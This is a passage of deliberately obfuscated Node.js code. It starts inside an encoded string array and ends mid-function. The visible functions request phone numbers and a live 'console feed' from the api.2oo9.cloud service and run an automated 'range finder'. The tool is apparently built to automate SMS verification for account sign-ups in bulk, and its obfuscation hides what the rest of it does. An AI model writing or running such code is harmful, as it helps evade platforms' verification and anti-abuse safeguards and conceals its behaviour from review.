'4PQHief1Dg8GzMv0y2GGzNjVBsbAzw5LEa', 'p2zYB209DgvHBxn5C3rLBq', 'zfrIzwq', 'Ee5Vu04', 'w0vsuK9sxsbgywLSzwqGDg8GAw5ZDgfSBcbKzxbLBMrLBMnPzxmUie1HA2uGC3vYzsboB2rLlMPZigfUzcboue0GyxjLigLUC3rHBgXLzc4', 'zKDVseG', 'Dgv4Dc9WBgfPBG', 'CMvKAxjLy3rvCMW', 'zxHPC3rZu3LUyW', 'nJu1nteYy0LTsfDw', 'uevJuw0', 'uNHtr0K', 'yKDgwxq', 'iokuGIa', 'BKzYrMm', 'A2zZq0i', 'BwfW', 'D2vIC2L0zuTLEq', 'iefqssaO', '4PYp77IpicbfBNrLCIbTyw51ywXSEq', 'r1bjyNa', 'DxnL', 'u2f2zsb0AgLZigTLEsbMB3iGzNv0DxjLihvZzt8', 'Ahr0CdOVlW', 'CMfUz2vZ', 'yM9KEv9ODg1S', 'cIaG4PYxie5VihzHBgLKihnLBgvJDgLVBI4k', 'AwrfC3K', 'B0vbAuu', 'qw50AunHChrJAgeGBMv0oIa', 'CgHVBMu', 'icaGicdILOJILOJILzeGicdILOJILOJILOJILOJILOJILOJILOJILzFILOJILOJILzeGiokwIokwIokvKEkwIokwIokvKsdILzRILzdILz0G4PAi4PAi4PwrcG', 'vurzCgS', 'yMrzyvm', 'ywDLBNq', 'lxnZAwqT', 'vM9SDhGG4PQH', 'u2LNBNvWlKvTywLSpq', 'CMvTB3zLx3bSDxm', 'l3rVA2vU', 'i0zgrdCWma', 'BevMvgm', 'mKnHChrJAge6ieLUDMfSAwqGsLnptG', 'cIaG4PYxie5VigHPDhmGAw4Gy29UC29SzsbMzwvKlGO', 'cIaGwW', 'rxDMsM8', 'y2fSBa', 'rLLrz1m', 'icHLlMCUidm5mZmXwfHywfGPig9YicDIywnRjZO', 'Dw5RBM93BG', 'ywXS', 'oduXmdfqCwHpz00', 'yw5KCM9Pza', 'Bwf4lwfNzt0W', 'nhWZFdv8mNW2Fdb8mxW3', 'zxjYB3jjza', 'igHPDhmPcG', 'DgvHBxn5C3rLBq', 'jtvelLjLCxvPCMvKpq', 'BfPKsLK', 'y1zLvNm', 'A0vSsfu', '8j+AQYboB25LicHeAxjLy3qGq29UBMvJDgLVBIK', '4PQHiejVDgGGkfjVDw5KlvjVyMLUlcbHDxrVlwzHBgXIywnRkq', 'u0TjtKCT', 'zMLUza', 'zw1PDeTLExbYzxnZrxzLBNrZ', 'B2fZwem', 'C3rYAw5N', 's2fcz1y', 'l3n0DwjZl2HHBMrSzxjFyxbPlNbOCd8', 'CNvdDgu', 'icburufnu1LtvevnifnnuYbuuKLhr0vsiokaLcbdt01qtevursaGicaGicaGia', 'nsbuAhjLywrZicHtBg93kq', 'rhPAAMO', 'u0vmrunuie5fweeGu0vsvKvs', 'yNbrDfy', 'y1Hksfa', 'vxbNCMfKzs1jBNnLy3vYzs1szxf1zxn0CW', 'CMvHC29U', 'qw50As1dyxb0y2HH', 'y3j5ChrV', 'mKnHChrJAgeGCg9SBcb0Aw1LB3v0', 'mKnHChrJAgeGy3jLyxrLvgfZAZOG', 'l2fWAs92ms9UDw1IzxjZl3aYl2DLDa', 'zvjStxa', 'vMXjzgi', 'A2v5ChjLC3m', 'DurTCK8', 'BhfrB0m', 'CgfZCW', 'C3rHDhvZ', 'wLnNswW', 'Dw5SAw5Ru3LUyW', 'icdILzRILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILz0k', 'BNvSBa', 'jNnPzf90B2TLBJ0', 'C3rHDhvZq29Kzq', 'zMfPBgvKlNr4Da', 'wgfLCxy', 'wZiVof0Gu29SDMLUzYbYzunbufrdseeGDJiGDMLHia', 'sNvHy3m', 'l0fJy291BNqVu2LNBNvWuhjPDMfJEunVBNnLBNrZp2n1Bhr1CMu9zw4TvvmMzw1HAwW9', 'EhD1ve0', 'z3vUEMLWu3LUyW', 'ls0Tls1cruDjtIbqvujmsumGs0vzls0Tls0ktunVD0jrwurlmLz3qxLfquLvn1bJnZvHBYTgBJDyr0m3A0zhzurOn0PbCZnVne5ttdjmz21omfLTzLK9cI0Tls0Tru5eifbvqKXjqYblrvKTls0Tlq', 'ue9tva', 'BMv3', 'jgnWDsa9icHhzxqTq2LTsw5ZDgfUy2uGv2LUmZjFuhjVy2vZC29Yic1fCNjVCKfJDgLVBIbtAwXLBNrSEunVBNrPBNvLihWGu2vSzwn0lu9IAMvJDcaTrMLYC3qGmsKUuhjVy2vZC29Yswq7ia', 'zw50zxi', 'rMf0ywWGzxjYB3i6ia', 'zgvMBgf0zq', '8j+tGsbmB2fKigzYB20GzMLSzsaOBNvTyMvYCY50EhqP', 'AfHgtey', 'DxbKyxrL', 'Dg9Rzw4', 'BwfPBc5JEcbUzxq6ia', 'C21ZlxjLC3bVBNnL', 'l3yXl2LUyM94lW', 'ELjbv3q', 'yvDKCNG', 'tw96AwXSys81lJaGke1Hy2LUDg9ZAdSGsw50zwWGtwfJie9tifGGmtbFmtvFnYKGqxbWBgvxzwjlAxqVntm3lJm2icHlsfrntcWGBgLRzsbhzwnRBYKGq2HYB21LlW', 'iK5VDdTbpujYyw5KiJT2psiYnci', 'BwfPBc50BsbUzxq6ia', 'CNfNzKG', 'CgfZC3DVCMq', 'AenUt3G', 'D1Lgre4', 'whvhCKu', 'Ahr0Ca', 'vgvWtwm', 'y2HYB21LvMvYC2LVBG', 'CgfKu3rHCNq', 'cIaGw1jHBMDLiezPBMrLCL0GrMv0y2HPBMCGBgL2zsbJB25ZB2XLigzLzwqUlI4', 'vMvYAwz5Aw5NieXPy2vUC2uUlI4GicaGicaGica', 'ruv5BMG', 's3HMzM8', 'Ag9ZDg5HBwu', 'ru5LDxy', 'Dc5Tzs9Zy3jHCgvYx2TPBMCGicaGicaGicaGica', 'z2TxEvi', 'uNHsCM4', 'yLHqrwq', 'zJ1JAgvJA19LBwfPBczZzxe9mczZAwrFDg9Rzw49', 'CMfUzg9T', 'q29UBMvJDgLVBG', 'Cgvnt2i', 'cIaG4PYxierPC2nVBM5Ly3rLzcbMCM9TieXPy2vUC2uGu2vYDMvYlGO', 'EKHUDfe', 'AKPXuvq', 'uMXHzgS', 'icaGicaGia', 'AeHMBfO', '4PscifVIGkjDifrVB2WGicaGica6ia', 'iK5VDcLbo0jYyw5KiJT2psiYnci', 'DMfSDwvZ', 'uefVzLG', 'uMvXDwLYzwq', '4PscifVIGkjDifLVDxiGsfDjrca6ia', 'EMrztLi', 'tM8Gy2fWDgnOysbZB2X2zxiGA2v5igf2ywLSywjSzq', 'qxv0B0fJy2vWDgfUy2u', 'Ahr0Chm6lY9PzgvUDgL0Es50zwfTC3LZDgvTlMnVBq', 'icdILia', 'iK5VDcLbo0jYyw5KiJT2psi5osi', 'D2P3uuW', 'zeLOueu', 'icaGicaBwZKWBq', 'cIaGrw50zxiGC2vSzwn0Aw9UicHLlMCUideSmYb8ideGmIa1ihWGms0ZkqO', 'swj6vwm', 'Bwf4uhjPy2u', 'DLDxvLO', 'uMz6teO', 'BNvTyMvYCY50Ehq', 'D29YA2vYx3rOCMvHzhm', 'sufszui', 'rhvHBcbtB2X2zxi', 'z2jKr0W', 'u2LNBNvWihbHz2uGCMv0DxjUzwqGsfruuca', 'mc41', 'cIaG4PYxieXPy2vUC2uGCgLUzYb0Aw1LB3v0lGO', '8j+tSsbbDxrVigzLDgnOigzYB20Gu01tiejVD2vY', 'q29UDgvUDc1mzw5NDgG', 'Bwv0yq', 'ywn0Aw9U', 'BwfPBc50Bsb0Aw1LB3v0', 'C3LZDgvTx2rVBwfPBNm', 'rgvMyxvSDfzHBhvL', 'u2jesxu', 'Ahr0ChmTChjVEhKTywDLBNq', 'iK5VDcbbkejYyw5KiJT2psi4iG', 'ExfHweG', 'Dg9vChbLCKnHC2u', 'qM1ttfC', 'tMDry0i', 'iK5VDc9bkujYyw5KiJT2psi4iG', 'u2vYDMvYideGkc9NzxqP', 'Cgf1C2u', 'DgvZDa', 'rM54yvC', 'r2fYy2LH', 'wZmVof0Gue9tvcbZAwDUDxaGzM9YBsaUlI4', 'mtaGvgHYzwfKCW', 'Axnby3rPDMu', 'tM8G', 'CM5xAxO', 'AgfZ', 'Dgv4Dc9ODg1SlgfWCgXPy2f0Aw9Ul3HODg1Sk3HTBcXHChbSAwnHDgLVBI94BwW7Ct0WlJKSAw1Hz2uVyxzPzIXPBwfNzs93zwjWlgLTywDLl2fWBMCSkI8Qo3e9mc44lgfWCgXPy2f0Aw9Ul3nPz25Lzc1LEgnOyw5NztT2pwiZo3e9mc43', 'C2vSzwn0', 'Dg90ywXoDw1IzxjZ', '4Psu4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4PsycG', 'iefqssbRzxKGChjVDMLKzwq', 'iK5VDd9bx0jYyw5KiJT2psi5osi', 'D2vIC2L0zvvsta', 'AhvoC2W', 'CgfYC2u', 'jMfJDgLVBJ1NzxroDw1IzxiMC2vYDMLJzt0', 'D2LUmZi', 'vxnLihnHDMvKigTLEq', 'lxnLC3nPB24T', 'jtvelKLKpq', 'rgf2Awq', 'yxbPlJjJyxb0y2HHlMnVBq', 'C2vJlwnOlxvHlw1VyMLSzq', 'wZGVof0Gu01tia', 'q1r3ALq', 'wMXdsgW', 'zMXVB3i', 'yMf0y2G', 'CMHUugC', 'oIb0Aw1LzcbVDxqGD2fPDgLUzYbMB3iGDMvYAwzPy2f0Aw9UigvTywLSicG1ig1PBIK', 'nKXLELzivvvbqufbquj3zwzHqvflz2DJEMLFvdzmneDVzvbfDenirW', 'q2nYr2K', 'iokCLYbty3jHCgvYieTPBMC', 'y29UC29SzvbHDgG', 'uMvXDwvZDfzLCMLMAwnHDgLVBLrVA2vU', 'iK5VDd1bx0jYyw5KiJT2psi5osi', 'mKnHChrJAge', 'z3PPCcWGzgvMBgf0zsWGyNi', 'q29UC29SztOGsw52ywXPzcbku09o', 'tujWB2W', 'g1SYsHTBm0OBw0G', 'D0ruEMi', 'CMvSzwfZzq', 'icHLlMCUidm5mZmXwfHywfGPig9Yihr5CguGj2jHy2SNoG', 'cIaG4PYxieXPy2vUC2uGDMvYAwzPy2f0Aw9UigzHAwXLzc4k', 'g1SWBsa', 'u0vmrunuifrbuKDfvcbovu1crvjtiezjteu', 'qMvHCMvYia', 'zJ1NzxrFzw1HAwXFywrKCMvZCYzSyw5NpwvU', 'C2LKx3rVA2vU', 'tw96AwXSys81lJaGkfDPBMrVD3mGtLqGmtaUmdSGv2LUnJq7ihG2ncKGqxbWBgvxzwjlAxqVntm3lJm2', 'werVDNK', 'BMv4yq', '4PQHief1Dg8Gzgv0zwn0icyGC2vUzcaOiZeGCMfUz2uP', 'EMvmExa', 'u3vJy2vZC2z1Ba', 'CMvHzezPBgvtEw5J', 'EwvSBg93', 'AxnbCNjHEq', 'Agv4', 'wZyVof0Gq2XPy2TPBMCGDMvYAwzPy2f0Aw9UigXPBMSGlI4U', 'xsbtDhjLyw1PBMCG', 'CMvZB2X2zq', 'Ffnnu19tru5ucG', 'zMfPBgvK', 'sM9hA3i', 'owvdD1Hnwq', 'iM1Hy09tiG', '4PYtifrHCMDLDcaGoIa', 'yxbPlNPLBMv4BMv0D29YAY5JB20', 'CMfUz2u', 'mM9VotOGsw52ywXPzcbku09o', 'DxbKyxrLx3jLCxvPCMvK', 'DgHYzwfKCW', 'C3vJy2vZCW', 'zunYD1G', 'ANvJwgu', 'C3bSAxq', 'z1vXCLC', 'C29JA3mTChjVEhKTywDLBNq', 'sgLNqLm', 'r3vLCNjPBgXHtwfPBdOGzMfPBgvKihrVigDLDcbPBMjVEa', 'q0rcrLO', 'ChjVEgLLC0zPBgu', 'r3vLCNjPBgXHtwfPBcb0Aw1LB3v0', 'y2HLzxjPBW', 'zxjYB3jdB2rL', 'q29UC2vUDhmGCgfNzsbYzxr1CM5Lzcbivfrqia', 'cIaGw/cFK7eGu01tiejVD2vYxsbtDhjLyw1PBMCG', 'sg93ig1HBNKGBNvTyMvYCZ8Gw2rLzMf1Bhq6iduWxtO', 'zwPZzuu', 'zxP5tha', 'BwfPBgn4', 'txDKweG', 'twf4ihbYAwnLihbLCIbUDw1IzxiGw2rLzMf1Bhq6idaUnv06', 'lIbbzgqGyw5VDgHLCJ8', 'C21ZlwvYCM9Y', 'EeTjy00', 'y2jRBve', 'cIaG4PYtifnLBgvJDgvKoIa', 'Cgf0Ag5HBwu', 'tMv4yu9uua', 'wMvUzxGGA2v5igzVDw5KicG', '4PscifVIGkjDifrLBgvNCMfTica6ia', 'y2XVC2u', 'q2HLy2TLza', 'y2HHAw4', 'AhDPza', 'v0LKC0m', 'yNjVDgXPrgvJB21WCMvZC1n5BMm', 'l01yuZq3rKXgwdbvl3rUzxnZl0bWDwjSAwmVyxbPl2DLDg51Bq', 'xs5dAgvJA2vKpxrYDwu', 'FhrLyw1ZExn0zw18ms4WlJb8', 'zxjYB3jezxnJCMLWDgLVBG', 'C2v0DgLUz3mGz2v0ihnLy3vYzsbHBMrYB2LKx2LKidi+l2rLDI9UDwXSihX8igvJAg8GiIi', 'u21ZqM93zxiGBMv0oIa', 's1fpsvG', 'AxnFBMf0Aw9UywW', 'su1rDNG', 'ms4WlJa', 'CezJuKe', 'qwf3s0u', 'yNb4Dfq', 'tw9jEha', 'qufpsxi', '4PYtienbufrdseeGoIa', 'cIaG4PYxieXPy2vUC2uGC2vYDMvYihvUCMvHy2HHyMXLlIbdAgvJAYbPBNrLCM5LDcbJB25Uzwn0Aw9UlGO', '8j+tPYbTywLSlMn4igTLEsbMB3vUzcaO', 'twLJAgfLBa', 'u2LNBNvWihzHBgLKyxrPB24GzMfPBgvKoIa', 'C29JA3m0', 't3jPz2LU', 'icdILidILiaGmKnHChrJAgeGs2v5iokuGokuGa', 'swHwyw4', '8j+uTYbbBNrPlunHChrJAgeGkgfUDgKTy2fWDgnOys5JB20P', 'jtvelLbVC2L0Aw9Upq', 'rgf2Axm', 'C2v0sw50zxj2ywW', 'lI4U', 'qwrKzwqG', 'uvjJDK8', 'uM9szgi', 'AgvHzgvYCW', 'zMLSDgvY', 'y1HgrLq', 'mM9VosbUzxr3B3jRoIa', 'tM8SihbYB2nLzwq', 'Aw5KzxHpzG', 'icdINjmGtgLJzw5ZztOG', 'lNzHBgLKyxrPB24TC3vTBwfYEs1LCNjVCNmGBgKSic5MAwvSzc12ywXPzgf0Aw9UlwvYCM9Y', 'sw5ZDwzMAwnPzw50igjHBgfUy2u', 'mJaGvgHYzwfKCYaOrgvMyxvSDcK', 'wKXWsgW', 'ks4GvxnLigL0pW', 'DM9SDhHFA2v5lNr4Da', 'CfLABNy', 'jMfJDgLVBJ1ZzxrtDgf0DxmMAwq9', 'r2XAvNy', 'cIaGw+kAOsbAzw5LEf0Gu3rYzwfTAw5Nia', 'u3Hdrue', 'jMnVDw50CNK9', 'uM9Izxj0', 'zNvUy3rPB24GkLWOicPCkq', 'vMrgwfu', 'vfnjrc1wms4WlJaGicaGicaGicaGicaGicaGica', 'wwveAKe', 'C3vJy2vZC2z1Ba', 'rKfuz0u', 'rw50zxiGCMfUz2uGiW', 'tMvdt0G', 'Aw5MBgf0zvn5BMm', 'BgvUz3rO', 'uNHMsLG', 'suTQqw8', 'tMvAruW', 'rw50zxiGBwfPBc5JEcbbueKGA2v5icH0Bv9SAxzLxY4UlIK', 'lJaU', 'rurKqKO', 'qw50AunHChrJAgeGy3jLyxrLvgfZAZOG', 'y2XPzw50s2v5', 'zY1YzwnHChrJAgeTCMvZCg9UC2u9', 'DMHPtNu', 'u0npEge', 'l0fJy291BNqVu2LNBNvWp2vTywLSpq', 'wwvZlcbHzgqGyw5VDgHLCIbYyw5Nzq', '4PYtieXVywrLzcaGoIa', 'Dw9OvMS', 'DhDVq2fWDgnOyuTLEq', 'uLzYq2y', 'DNvpEgW', 'zg9JDw1LBNq', 'jtvelKrLzMf1BhrwywX1zt0', 'u2vYDMvYidmGkc9WmY9NzxqP', 'BwfPBgn4x2TLEs50Ehq', 'cIaG4PYxifbPBMCGCgfYC2uGzxjYB3iUiev4AxrPBMCUlI4k', '8j+uTIaYq2fWDgnOysaOmMnHChrJAgeUy29Tkq', 'BLr1Bxy', 'iK5VDf9biejYyw5KiJT2psiYnci', 'vg15rNm', 'zgvIDq', 'q29UDgvUDc1uExbL', 'icbB', 'Cev1ueu', 'AgTPy2y', 'swDZwNm', 'C3rKAw4', 'wwvZ', 'C1nwyKO', 'vgvTCea', 'BwvZC2fNzq', 'wMTuAhu', 'A2Tmthu', 'B3v4suu', 'EwDsDuK', 'u2nYyxbLCIblAw5N', 'C0v0veO', 'AeDrrfO', 'uxvPqKu', 'mdaWmdaWmdaWmdaWmdaWma', 'Eg1KC1a', 'CuDtBuW', 'q2HHCMXLCW', 'iK5VDcLbpujYyw5KiJT2psi4iG', 'AfH4BeG', 'EurAtLe', 'AxnqCML2yxrL', 'B1LcB1i', 'iefqssblzxKGkg1HDxrOyxbPktO', 'qxv0Ag9YAxPHDgLVBG', 'Ag9ZDa', 'EgvMyLK', 'vgf5Bg9Y', 'uhzvse8', 'zw5XDwv1zq', 'shzuA0W', 'rMfPBgvK', 'BwfPBc50BtOGBM8Gzg9TywLUCYbHDMfPBgfIBgu', 'uMvTB3zLicH1C2uGzNjLzsbMywXSyMfJAYK', 'rw50zxiGu01tiejVD2vYiefqssblzxK6', 'v3nrr3u', 'pgrPDJ5jigHLCMvIEsbKzwnSyxjLihrOyxqGssbOyxzLihjLywqGyw5KigfJy2vWDcb0AguGpgeGAhjLzJ0IAhr0Chm6lY90yY50zwfTC3LZDgvTlMnVBs9dB25KAxPPB25Pr2vUzxjHBgLuzwfTu3LZDgvTsuqUCgrMiIbYzwW9iM5VB3bLBMvYig5VCMvMzxjYzxiIihrHCMDLDd0Ix2jSyw5RiJ5hzw5LCMfSifrLCM1ZigfUzcbdB25KAxrPB25Zpc9HpIaODgHLiczSzhf1BZThzw5LCMfSifrLCM1ZigfUzcbdB25KAxrPB25ZjNjKCxvVoYKGyw5KihrOyxqGssbOyxzLihjLywqGDgHLidXHigHYzwy9iMH0DhbZoI8VD3D3lNrLyw1ZExn0zw0Uy29Tl3bYAxzHy3KTCg9SAwn5lwvUlYiGCMvSpsjUB29Wzw5LCIbUB3jLzMvYCMvYiIb0yxjNzxq9iL9IBgfUAYi+uhjPDMfJEsbqB2XPy3KUpc9HpIaQpc9KAxy+', 'Bwzku2G', 'CNDPAui', 'CeztANa', 'mtG4lJeZnY4XnZyUmtyZ', 'BKrnEhC', 'w1nfvfvqxsbezxbLBMrLBMnPzxmGAw5ZDgfSBgvKihn1y2nLC3nMDwXSEsek', 'Dhn0Cg4', 'qMvPtvi', 'icaGicdILOJILOJILzeGicdILOJILOJILOJILOJILOJILzCGiokwIokwIokwIokwIokwIokwIokwIokvKEkwIokwIokvLokwIokwIokwIokwIokvLokwIokwIokvKq', '4OYO77Ipien1C3rVBs4UlG', 'yKzovg0', 'ChjVDMLKzxi', 'DM9SDhG', 'iZmZmZmZmW', 'zw5K', 'icaGg1SZm20', 'AwrLBNrPDhK', 'zM9YrwfJAa', 'uMvJyxb0y2HHvJjuyxnRuhjVEhLSzxnZ', 'tMv4yu9uudOGvgLTzw91Da', 'AuP2vum', 'DMfSAwrHDgLVBI1ZDw1Tyxj5lwvYCM9YCW', 'sKnOt24', 'rKfuquW6ieLUDMfSAwqGChjVEhKU', 'lI4Ukq', 'l2fWAs9WAw5N', 'CgLWzq', 'tLLjshq', 'CMvZDw1L', 'qw50AunHChrJAgeGCg9SBdOG', 'u2zQBgm', 'Ec1HCgKTDg9Rzw4', 'rxrUvvi', 'u2LNBNvWlLn1CM5HBwu9', 'C3vIC3rYAw5N', 'uhjVzMLSzs9tzwn1CML0EsbWywDLihjLDhvYBMvKieHuvfaG', 'rw50zxiGtMv4yu9uucbbueKGs2v5icH0ExbLicDIywnRjYb0BYbNBYbIywnRktO', 'ywDjzMW', 'C2v0', 'tMv4yu9uudOGtM8GBNvTyMvYihjLDhvYBMvK', 'C2fTzs1VCMLNAw4', 'zgHbwLy', 'xsdINjCGnsbJB25Zzwn1DgL2zsbMywLSDxjLCZOG', 'cIaG4PYtief1Dg8GuMfUz2u6ia', 'jtvelLrLEhq9', 'sMfTzxm', 'Dg9tDhjPBMC', 'mJG2otK3mxjxtNrgrG', 'yMfZzty0', 'g1SWBqO', 'Dwrbr2m', 'C29SDxrPB24', 'CxzyB0O', 'DgLTzxn0yw1W', 'Dg9ju09tDhjPBMC', 'y2HPBgrFChjVy2vZCW', 'DhLWzq', 'zMLSzq', 'twzYsMK', 'Ae56wMu', 'D2HPBguGkhrYDwuPihT9', 'Cejdr1i', 'qundrvntx05vtujfuJO', 'EfDSswm', 'mtv3qwzIzfq', 'B2jQzwn0', 'yxbWBgLJyxrPB24VEc13D3CTzM9YBs11CMXLBMnVzgvK', 'ChbJyMG', 'AgL0CW', 'l3yXl2vTywLSlW', 'u2nYyxbLCIblAw5NicaGicaGicaGicaGicaGica', 'whbTv08', 'uuzTAg8', 'tK9uifjfr0LtvevsruqGlYbsru1pvKve', 'iZaWqJreoa', 'BwfPBgn4lwvTywLSlxbYzxzPzxC', 'z3jLzw4', 'Dendq3G', 'B1jsDNm', 'qw50As1dyxb0y2HHicSGmKnHChrJAgeG4PQH', 'yxr0CG', 'C29JA3m1oI8V', '4PscifVIGkjDifn0yxr1CYaGica6ia', 'C3rKAw8', 'CMvHzgXPBMu', 'BgLZDa', 'qwnJzxb0luXHBMD1ywDL', 'y3rYBa', 'CLLsyKi', 'zhLor2C', 'CMPruKm', 'z2XHqvy', 'A25Ir00', 'qKL3ufq', '4PscifVIGkjDifzLCNnPB24Gica6ia', 'cIaG4PYxifvWzgf0zsbYzxf1AxjLzcek', 'A2T3v2S', 'DeLUqu4', 'wwvZlcbZyxzLigL0', 'AM9PBG', '4QYf77IpiejHy2S', 'ChvZAa', 'ogvMogm2nZmTzgjHnc00zdmYltKWnZqTmdHKztuZnMy3ogqW', 'l2fWAs92zxjPzNK', 'zfLfCfi', 'CK9QAee', 'B3bNAxC', 'x3bYB2nLC3m', 'u0vmrunuifbst1HjrvmGrKLmrq', 'CgfKrw5K', 'xs5uzxH0pq', 'q29UC2vUDhnB', 'yMjgtLG', 'z3fZvhC', 'uwnMwgu', 'iK5VDdTbkujYyw5KiJT2psiYnci', 'odK1mJq2mvn2r0rfrG', 'xs5bDxrVqwnJzxb0yw5Jzt0', 'BwfPBf9IB2r5', 'zw1HAwWTAw5IB3G', 'CMLK', 'y29YCW', 'B05qzLm', 'Bw9KzwW', 'otrMztbMytaTywuYmI00mdmXltDLyMmTmdHKztuZnMy4nJi2', 'zJ1MzxrJAf9LBwfPBczLBwfPBf9Pzd0', 'EM1ovNG', 'DuPiwNy', 'AhLKCMe6BwvTyMvY', 'z3jHEq', 'qu5lsu5hlq', 'qvPjzKW', 'vcuYnKmRmG', 'BMnSCMy', 'uvbxq3G', 'yxv0BW', 'wu1wDNa', 'tNbprgG', 'BvHXqKO', 'vefstK0', 'CezUr2y', 'y29Kzq', 'zgvZDhjVEq', 'C2fTDg4', 'icdILzeGifn0yxr1CYa6ia', 'Cg9W', 'icaGicaGicaGicaGicaGicaGicaGica', 'C2vYDMLJzq', 'BwfPBc50BtOGywnJB3vUDcbJCMvHDgLVBIbMywLSzwqGka', 'E30Uy29UC3rYDwn0B3iOiNjLDhvYBIb0AgLZiIKOicK', 'u2LNBNvWlK5HBwu9', 'yxbPlMD1zxjYAwXSyw1HAwWUy29T', 'Ag9kvKy', 'zg9TywLUCW', 'Aw9IsMu', 'C3rMExO', 'icdILzeGienVBNrHy3q6ihqUBwuVC2nYyxbLCL9RAw5NihrVihjLz2LZDgvYicaGicdILze', 'D3zmBMS', 'Cu91zge', 'cIaG4PYxieLUDMfSAwqGu2vYDMvYifjLC3bVBNnLoIbnAxnZAw5NifnLC3nPB24Gvg9Rzw4UcG', 'C2vJDxjPDhKTy3nYzG', 'kI8Q', 'u2LNBNvWlLbHC3n3B3jKpq', 'l1bYB2zPBguVu2vJDxjPDhK', '4P2miev4AxqGuhjVz3jHBq', 'BwLwyNu', 'uLDnuM0', 'z1rqz0O', 'q29UC29SzsbUzxr3B3jRoIa', 'uKnSA2G', 'CKfyAvm', 'qvflzvC', 'C0XfveO', 'yw50AwnHChrJAgfFA2v5lNr4Da', 'yxbPlMfUDgKTy2fWDgnOys5JB20', 'xs5jzd0', 'Cgf0Aa', 'cIaG4PYxieHxsuqGAw50zwDYAxr5ignOzwnRigzHAwXLzc4k', 'id09pqO', 'Bwv0yvTUyw1Lpsjszxf1zxn0vMvYAwzPy2f0Aw9Uvg9Rzw4Ixq', 'zwfJAa', 'yw50AunHChrJAgflzxK', 'AhrTBa', 'EMvUzxHFA2v5lNr4Da', 'D3jPDgvgAwXLu3LUyW', 'sxDgvuG', 'tMXxt00', 'wMvUzxG6igLUDMfSAwqGsLnptG', 'l2fWAs92ms9UDw1IzxjZl2DLDa', 'q0nxvfK', 'C01yChy', 'q2nLqva', 'y0LjrfG', 'zg93BG', 'iZu1ntu1nq', 'vvrgzuW', 'ywrKtg9N', 'iokCPIbty3jHCgvYieTPBMC', 'z2v0ugf0Aa', 'u2vJluzLDgnOlurLC3q', 'tfjjsuu', 'ELfjsgu', 'v2LSBgLHBq', 'ihjHBMDLkhmPlIbbzgqGyw5VDgHLCJ8', 't2HNwMK', 'u01tiejVD2vYigTLEsbMB3vUzcaO', 's0zkqvO', 'cIaG4PYxie5VihzHBgLKihjHBMDLCY4k', 'tw96AwXSys81lJaGkfDPBMrVD3mGtLqGmtaUmdSGv2LUnJq7ihG2ncKGqxbWBgvxzwjlAxqVntm3lJm2icHlsfrntcWGBgLRzsbhzwnRBYKGq2HYB21LlW', 'sw1YAMq', 'uejOD0q', 'z3jLyxnL', 'q1Dlrvi', 'sg93ig1HBNKGBNvTyMvYCZ8Gw2rLzMf1Bhq6ntbDoG', 'zw50CMLLCW', 'zwDzDfa', '8j+tPYbTywLSlMn4ifrLBxaGrw1HAwWGuhjVDMLKzxi', 'CMHotgm', 'yxjNDG'];
  fn1 = function () {
    return v59;
  };
  return fn1();
}
function stripRid(v60) {
  return v60.replace(/X+$/i, '').trim();
}
function twoOoFetchNumber(v61, v62, v63) {
  return new Promise((v64, v65) => {
    const v66 = stripRid(v62),
      v67 = {};
    v67.rid = v66;
    const v68 = JSON.stringify(v67),
      v69 = {
        'hostname': "api.2oo9.cloud",
        'port': 0x1bb,
        'path': v63,
        'method': "POST",
        'headers': {
          'mauthapi': v61,
          'Content-Type': "application/json",
          'Content-Length': Buffer.byteLength(v68)
        }
      };
    const v70 = https.request(v69, v71 => {
      let v72 = '';
      v71.on("data", v73 => v72 += v73);
      v71.on("end", () => {
        try {
          const v74 = JSON.parse(v72);
          if (v74?.["meta"]?.["code"] === 0xc8 && v74?.["data"]?.["no_plus_number"]) v64(v74.data.no_plus_number);else v65(new Error(v74?.["message"] || v74?.["meta"]?.["status"] || "2oo9: No number"));
        } catch (v75) {
          v65(new Error("2oo9: Invalid JSON"));
        }
      });
    });
    v70.on("error", v76 => v65(new Error("2oo9 network: " + v76.message))), v70.setTimeout(0x2710, () => {
      v70.destroy(), v65(new Error("2oo9: Timeout"));
    }), v70.write(v68), v70.end();
  });
}
function twoOoFetchConsole(v77, v78) {
  return new Promise((v79, v80) => {
    const v81 = {};
    v81.mauthapi = v77;
    const v82 = {};
    v82.hostname = "api.2oo9.cloud", v82.port = 0x1bb, v82.path = v78, v82.method = "GET";
    v82.headers = v81;
    const v83 = v82,
      v84 = https.request(v83, v85 => {
        let v86 = '';
        v85.on("data", v87 => v86 += v87);
        v85.on("end", () => {
          try {
            const v88 = JSON.parse(v86);
            if (v88?.["meta"]?.["code"] === 0xc8 && Array.isArray(v88?.["data"]?.["hits"])) v79(v88.data.hits);else v80(new Error(v88?.["message"] || "Console fetch failed"));
          } catch (v89) {
            v80(new Error("Console: Invalid JSON"));
          }
        });
      });
    v84.on("error", v90 => v80(new Error("Console network: " + v90.message))), v84.setTimeout(0x2710, () => {
      v84.destroy(), v80(new Error("Console timeout"));
    });
    v84.end();
  });
}
function parseTwoOoRangeSelection(v91, v92) {
  const v93 = new Set(),
    v94 = v91.split(/[\s,]+/).filter(v95 => v95);
  for (const v96 of v94) {
    const v97 = v96.match(/^(\d+)-(\d+)$/);
    if (v97) for (let v98 = +v97[0x1]; v98 <= +v97[0x2]; v98++) {
      if (v98 >= 0x1 && v98 <= v92) v93.add(v98 - 0x1);
    } else {
      const v99 = parseInt(v96);
      if (!isNaN(v99) && v99 >= 0x1 && v99 <= v92) v93.add(v99 - 0x1);
    }
  }
  return [...v93].sort((v100, v101) => v100 - v101);
}
async function autoRangeFinderFor2Oo(v102, v103, v104, v105) {
  console.log(chalk.gray("\n  [Range Finder] Fetching live console feed..."));
  let v106 = [];
  try {
    v106 = await twoOoFetchConsole(v102, v103);
  } catch (v112) {
    return console.log(chalk.red("\n  ✗ Console fetch failed: " + v112.message + '\x0a')), null;
  }
  const v107 = v106.slice(0x0, 0x64);
  if (v107.length === 0x0) return console.log(chalk.red("\n  ✗ No hits in console feed.\n")), null;
  const v108 = {};
